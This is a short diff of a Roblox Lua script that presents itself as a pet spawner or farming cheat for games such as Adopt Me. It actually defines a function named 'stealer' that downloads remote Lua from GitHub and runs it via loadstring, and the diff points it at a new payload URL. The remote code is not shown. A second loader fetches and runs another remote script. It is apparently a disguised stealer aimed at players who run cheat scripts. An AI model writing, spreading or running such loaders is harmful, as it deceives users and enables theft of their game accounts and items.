@@ -1,9 +1,13 @@
 local function stealer()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptLast/Growagarden/refs/heads/main/Script.lua'))()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMe5SS/HiraHub/refs/heads/main/AdoptMeScript.lua'))()
 end
-local function loadui()
+
+local function farm()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMe5SS/PetSpawner1/refs/heads/main/script1.lua'))()
 end
 
 task.spawn(stealer)
-task.spawn(loadui)
+
+for i = 1, 1 do
+    task.spawn(farm)
+end
